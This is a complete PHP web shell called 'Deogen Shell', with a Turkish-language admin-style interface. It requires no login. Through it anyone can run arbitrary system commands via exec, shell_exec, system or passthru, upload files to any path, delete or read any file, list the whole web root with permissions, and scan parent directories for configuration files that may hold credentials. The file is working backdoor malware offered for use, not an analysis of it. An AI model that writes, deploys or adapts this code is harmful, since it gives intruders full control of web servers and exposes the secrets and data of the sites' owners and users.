<?php


$message = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['fileToUpload'])) {
    $uploadDir = $_POST['location'];
    $targetFile = $uploadDir . basename($_FILES['fileToUpload']['name']);
    if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
        $message = "Dosya başarıyla yüklendi: " . htmlspecialchars($_FILES['fileToUpload']['name']);
    } else {
        $message = "Dosya yükleme başarısız oldu.";
    }
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?message=" . urlencode($message));
    exit;
}


if (isset($_POST['delfile'])) {
    $fileToDelete = $_POST['delfile'];
    if (file_exists($fileToDelete)) {
        unlink($fileToDelete);
        $message = "Dosya başarıyla silindi: " . htmlspecialchars($_POST['delfile']);
    } else {
        $message = "Silinecek dosya bulunamadı.";
    }
    
    header("Location: " . $_SERVER['PHP_SELF'] . "?message=" . urlencode($message));
    exit;
}




if (isset($_GET['message'])) {
    $message = htmlspecialchars($_GET['message']);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['dosya_yolu'])) {
    $dosyaYolu = $_POST['dosya_yolu']; 


    if (file_exists($dosyaYolu) && is_readable($dosyaYolu)) {
   
        $icerik = file_get_contents($dosyaYolu);

      
        header('Content-Type: text/plain'); 
        echo $icerik;
        exit;
    } else {
    
        echo "<p style='color: red;'>Dosya bulunamadı veya okunamıyor: $dosyaYolu</p>";
    }
}

function listFilesAndDirectories($directory)
{
    $dosyalar = [];

    if (!is_readable($directory)) {
        return [];
    }

    
    $items = scandir($directory);
    if ($items === false) {
        return [];
    }

    foreach ($items as $item) {
        if ($item !== '.' && $item !== '..') {
            $path = $directory . DIRECTORY_SEPARATOR . $item;

            
            if (is_dir($path)) {
                
                $altDosyalar = listFilesAndDirectories($path);
                $dosyalar = array_merge($dosyalar, $altDosyalar);
            } else {
                
                $permissions = fileperms($path);
                $formattedPermissions = substr(sprintf('%o', $permissions), -4);
                $dosyalar[] = [$path, $directory, $formattedPermissions, $item];
            }
        }
    }

    return $dosyalar;
}


$rootDirectory =  $_SERVER['DOCUMENT_ROOT']; 
function listConfigFilesReverse($startDir, $extensions = ['conf', 'ini', 'yaml', 'yml', 'json', 'xml'])
{
    $configFiles = [];
    $currentDir = realpath($startDir);

    while ($currentDir) {
        try {
          
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($currentDir));

            foreach ($iterator as $file) {
                try {
                    if ($file->isFile()) {
                        $ext = pathinfo($file->getFilename(), PATHINFO_EXTENSION);
                        if (in_array($ext, $extensions)) {
                            $configFiles[] = $file->getPathname();
                        }
                    }
                } catch (Exception $e) {
                    echo "Dosya atlandı: " . $file->getPathname() . " - Hata: " . $e->getMessage() . PHP_EOL;
                    continue;
                }
            }
        } catch (Exception $e) {
            echo "Dizin atlandı: " . $currentDir . " - Hata: " . $e->getMessage() . PHP_EOL;
        }

    
        $currentDir = dirname($currentDir);

  
        if ($currentDir === '/' || $currentDir === realpath(getenv('SystemDrive') . '\\')) {
            break;
        }
    }

    return $configFiles;
}


$startDir = __DIR__; 


function runCommand($command, $method = 'exec')
{
    $output = '';
    $return_var = 0;

    switch ($method) {
        case 'exec':
           
            exec($command, $output, $return_var);
            break;

        case 'shell_exec':
       
            $output = shell_exec($command);
            break;

        case 'system':
           
            $output = system($command, $return_var);
            break;

        case 'passthru':
           
            passthru($command, $return_var);
            break;

        default:
            throw new Exception("Geçersiz yöntem: $method");
    }


    return [
        'output' => $output,
        'return_var' => $return_var
    ];
}


if (isset($_POST["runmode"]) && isset($_POST["command"]))

    $result = runCommand($_POST["command"], $_POST["runmode"]);





?>

<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Deogen Shell</title>

    <!-- Custom fonts for this template-->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" rel="stylesheet"
        type="text/css">
    <link
        href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"
        rel="stylesheet">

    <!-- Custom styles for this template-->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/startbootstrap-sb-admin-2/4.1.4/css/sb-admin-2.min.css"
        rel="stylesheet">
    <link href="https://cdn.datatables.net/1.13.6/css/dataTables.bootstrap4.min.css" rel="stylesheet">

    <style>
        .bg-darkus {
            background-color: #1f1f1f !important;
        }

        .card,
        .card-header {
            background-color: #1f1f1f !important;
        }

        .text-primary {
            color: white !important;
        }

        p,
        label,
        span {
            color: white;
        }

        .btn-primary {
            background-color: darkmagenta !important;
            border-color: darkmagenta !important;
        }

        
        .table-striped tbody tr:nth-child(odd) {
            background-color: #f1f1f1;
          
        }

        .table-hover tbody tr:hover {
            background-color: #e0e0e0;

        }

        .table th {
            background-color: darkmagenta;
            color: white;
           
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button {
            background-color: darkmagenta;
            color: white;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button:hover {
            background-color: darkmagenta;
          
        }

        .paginate_button.page-item.active {
            background-color: darkmagenta !important;
            border-color: darkmagenta !important;
            
        }

        .paginate_button.page-item.active a {
            color: white !important;
            
        }

        .form-control
        {
            background-color: #1f1f1f !important;
            color: white !important;
        }
    </style>
</head>

<body id="page-top" class="bg-dark">

    <!-- Page Wrapper -->
    <div id="wrapper">


        <!-- End of Sidebar -->

        <!-- Content Wrapper -->
        <div id="content-wrapper" class="d-flex flex-column bg-darkus">

            <!-- Main Content -->
            <div id="content">


                <!-- Begin Page Content -->
                <div class="container-fluid">

                    <!-- Page Heading -->
                    <div class="d-sm-flex align-items-center justify-content-between mb-4 mt-4">
                        <h1 class="h3 mb-0 text-white-800">Deogen Shell</h1>

                    </div>


                    <!-- Son İşlem -->
                    <div>
                        <div class="card shadow mb-4">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Son İşlem Durumu</h6>
                            </div>
                            <div class="card-body">
                                <?php
                                if ($message) {
                                    echo '<p style="color: #00bf00;">' . $message . '</p>';
                                }

                                if ($result) {
                                  
                                    echo "<p style='color: #00bf00;'>Komut Çıktısı:\n";
                                    if ($_POST["runmode"] == "exec") {
                                        print_r($result["output"]) . "\n";
                                    } else {
                                        echo $result['output'] . "\n";
                                    }

                                    echo "Dönüş Kodu: " . $result['return_var'] . "\n</p>";
                                }

                                ?>
                            </div>
                        </div>
                    </div>
                    <!-- Son İşlem -->

                    <!-- CMD -->
                    <div class="">
                        <div class="card shadow mb-4">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Komut Çalıştır</h6>
                            </div>
                            <div class="card-body">
                                <form action="" method="post">
                                    <div class="form-group mb-2">
                                        <p class="font-weight-bold">Kullanılabilir Örnek Kodlar:</p>
                                        <p class="ml-4"> - ls (Linux) / dir (Windows)</p>
                                        <p class="ml-4"> - echo "Hello World" > hello.txt (Linux & Windows)</p>
                                        <p class="ml-4"> - cat hello.txt (Linux) / type hello.txt (Windows)...</p>


                                    </div>

                                    <div class="form-group">
                                        <label for="runmode">Çalıştırma Modunu Seçin:</label>
                                        <select class="form-control" name="runmode" id="runmode">
                                            <option value="exec">exec (Çıktıyı Dizi Olarak Döndürür)</option>
                                            <option value="shell_exec">shell_exec (Çıktıyı String Olarak Döndürür)
                                            </option>
                                            <option value="system">system (Çıktıyı Anında Yazdırır)</option>
                                            <option value="passthru">passthru (Çıktıyı Ham Haliyle Yazdırır)</option>
                                        </select>
                                    </div>
                                    <div class="form-group">
                                        <label for="command">Çalıştırılacak Komut:</label>
                                        <input class="form-control" type="text" name="command" id="command">
                                    </div>

                                    <button class="btn btn-primary" type="submit">Çalıştır</button>
                                </form>
                            </div>
                        </div>
                    </div>
                    <!-- CMD -->

                    <!-- Dosya Yükle -->
                    <div>
                        <div class="card shadow mb-4">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Dosya Yükle</h6>
                            </div>
                            <div class="card-body">

                                <form action="" method="post" enctype="multipart/form-data">
                                    <div class="form-group mb-4">
                                        <label for="location">Dosya Lokasyonu: </label>
                                        <input class="form-control mb-2" type="text" name="location" id="location"
                                            required>
                                    </div>
                                    <div class="form-group mb-4">
                                        <label for="fileToUpload">Seçilen Dosya: </label>
                                        <input class="form-control-file mb-2" type="file" name="fileToUpload" required>
                                    </div>
                                    <button class="btn btn-primary" type="submit">Yükle</button>
                                </form>
                            </div>
                        </div>
                    </div>
                    <!-- Dosya Yükle -->



                    <!-- Sunucudaki Dosyalar -->
                    <div class="">
                        <div class="card shadow mb-4">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Sunucudaki Dosyalar</h6>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
                                        <thead>
                                            <tr>
                                                <th>Dosya Adı</th>
                                                <th>Lokasyonu</th>
                                                <th>İzinleri</th>
                                                <th>İşlemler</th>

                                            </tr>
                                        </thead>
                                        <tfoot>
                                            <tr>
                                                <th>Dosya Adı</th>
                                                <th>Lokasyonu</th>
                                                <th>İzinleri</th>
                                                <th>İşlemler</th>
                                            </tr>
                                        </tfoot>
                                        <tbody>
                                            <?php

                                            foreach (listFilesAndDirectories($rootDirectory) as $key => $value) {

                                                $dosya_full_lokasyon = $value[0];
                                                $dosya_adi = $value[3];
                                                $dosya_lokasyonu =  $value[1];
                                                $dosya_izinleri = $value[2];

                                                echo '<tr>
                                                <td>' . $dosya_adi . '</td>
                                                <td>' . $dosya_lokasyonu . '</td>
                                                <td>' . $dosya_izinleri . '</td>
                                                <td>
                                                <form method="POST">
                                                        <input type="hidden" name="dosya_yolu" id="dosya_yolu" value="' . $dosya_full_lokasyon . '" required>
                                                        <button class="btn btn-primary" type="submit">İncele</button>
                                                </form>
                                                <form action="" method="post" style="display:inline;">
                                                    <input type="hidden" name="delfile" value="' . $dosya_full_lokasyon . '">
                                                    <button class="btn btn-danger " type="submit">Sil</button>
                                                </form>
                                                </td>
                                                
                                            </tr>';
                                            }

                                            ?>

                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>

                    </div>
                    <!-- Sunucudaki Dosyalar -->



                    <!-- Konfigrasyon Listesi -->
                    <div>
                        <div class="card shadow mb-4">
                            <div class="card-header py-3">
                                <h6 class="m-0 font-weight-bold text-primary">Konfigrasyon Dosyalarını Bul</h6>
                            </div>
                            <div class="card-body">
                                <div class="table-responsive">
                                    <table class="table table-bordered" id="dataTableconfig" width="100%"
                                        cellspacing="0">
                                        <thead>
                                            <tr>
                                                <th>Dosya</th>
                                                <th>İşlemler</th>

                                            </tr>
                                        </thead>
                                        <tfoot>
                                            <tr>
                                                <th>Dosya</th>
                                                <th>İşlemler</th>
                                            </tr>
                                        </tfoot>
                                        <tbody>
                                            <?php


                                            
                                            $configFiles = listConfigFilesReverse($startDir);


                                            foreach ($configFiles as $file) {
                                                echo '<tr>
                                                <td>' . $file . '</td>
                                                <td><form method="POST">
                                                <input type="hidden" name="dosya_yolu" id="dosya_yolu" value="' . $file . '" required>
                                                <button class="btn btn-primary" type="submit">İncele</button>
                                        </form></td>
                                               
                                               </tr>';
                                            }
                                            ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- Konfigrasyon Listesi -->


                </div>
                <!-- /.container-fluid -->

            </div>
            <!-- End of Main Content -->

            <!-- Footer -->
            <footer class="sticky-footer bg-dark">
                <div class="container my-auto">
                    <div class="copyright text-center my-auto">
                        <span> Deogen Shell thanks for your help furkan-karapinar 💜 </span>
                    </div>
                </div>
            </footer>
            <!-- End of Footer -->

        </div>
        <!-- End of Content Wrapper -->

    </div>
    <!-- End of Page Wrapper -->
    <script>
      
        document.addEventListener("DOMContentLoaded", function () {
            $('#dataTable').DataTable();
            $('#dataTableconfig').DataTable();
        });
    </script>



    <!-- Bootstrap core JavaScript-->
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/js/bootstrap.min.js"></script>

    <!-- Core plugin JavaScript-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>

    <!-- Custom scripts for all pages-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/startbootstrap-sb-admin-2/4.1.4/js/sb-admin-2.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.6/js/dataTables.bootstrap4.min.js"></script>

</body>

</html>